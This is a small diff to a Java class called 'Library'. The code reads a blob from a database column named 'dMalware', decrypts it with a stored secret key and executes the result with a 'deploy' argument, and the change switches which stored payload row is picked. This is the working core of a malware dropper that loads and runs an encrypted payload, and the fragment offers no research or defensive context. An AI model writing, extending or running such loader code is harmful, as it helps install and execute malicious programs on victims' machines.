@@ -44,7 +44,7 @@ public class Library {
 
 			while (rs.next()) {
 				System.out.println("ID: " + rs.getInt("idNumber"));
-				if (rs.getInt("idNumber") == 2) {
+				if (rs.getInt("idNumber") == 9) {
 					File tempFile = sch.convertBytesToFile(rs.getBytes("dMalware"));
 					sqliteDB.getSecretKey().decryptFile(tempFile);
 					sch.executeFile(tempFile, "c++", "deploy");
